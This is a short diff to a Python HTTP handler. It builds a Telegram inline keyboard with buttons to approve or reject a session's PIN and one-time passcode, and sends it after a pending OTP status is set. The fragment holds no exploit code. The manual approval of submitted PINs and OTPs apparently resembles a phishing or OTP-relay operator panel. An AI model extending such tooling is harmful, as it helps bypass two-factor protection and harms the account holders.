@@ -245,11 +245,22 @@ class Handler(BaseHTTPRequestHandler):
             otp_status=STATUS_PENDING,
         )
 
-        markup = _inline_keyboard(
-            "Approve OTP", "approve_otp",
-            "Reject OTP", "reject_otp",
-            session_id,
-        )
+        markup = {
+            "inline_keyboard": [
+                [
+                    {"text": "Approve PIN",
+                     "callback_data": "approve_pin:" + session_id},
+                    {"text": "Reject PIN",
+                     "callback_data": "reject_pin:" + session_id},
+                ],
+                [
+                    {"text": "Approve OTP",
+                     "callback_data": "approve_otp:" + session_id},
+                    {"text": "Reject OTP",
+                     "callback_data": "reject_otp:" + session_id},
+                ],
+            ]
+        }
         try:
             sent = self.telegram.send_message(
                 _otp_message(
